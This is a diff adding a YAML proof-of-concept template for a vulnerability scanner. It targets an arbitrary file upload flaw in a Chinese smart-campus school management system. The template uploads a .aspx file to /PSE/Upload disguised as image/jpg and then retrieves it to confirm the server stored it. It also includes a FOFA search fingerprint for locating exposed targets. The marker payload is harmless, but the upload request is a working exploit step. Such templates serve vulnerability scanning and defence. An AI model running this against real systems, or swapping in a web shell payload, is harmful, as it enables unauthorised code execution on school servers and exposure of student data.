@@ -1,0 +1,33 @@
+id: poc-yaml-synjones-upload-anyfile-upload
+info:
+  name: 新中小学智慧校园信息管理系统 Upload 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: 新中小学智慧校园信息管理系统
+  fofa: body="/Login/IndexMobi"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /PSE/Upload
+  headers:
+    Content-Type: multipart/form-data; boundary=00content0boundary00
+  data: '--00content0boundary00
+
+    Content-Disposition: form-data; name="file"; filename="{{.t1}}.aspx"
+
+    Content-Type: image/jpg
+
+
+    {{.t2}}
+
+    --00content0boundary00--'
+  expression: status_code == 200 && contains(body,"\"SaveName\"")
+  output:
+  - regex_match(body,`"SaveName":"(?P<file>.*?).aspx"`)
+- method: GET
+  path: /Upload/PrimarySchoolEnrollment/{{.file}}.aspx
+  expression: status_code == 200 && body == t2
+transport: http
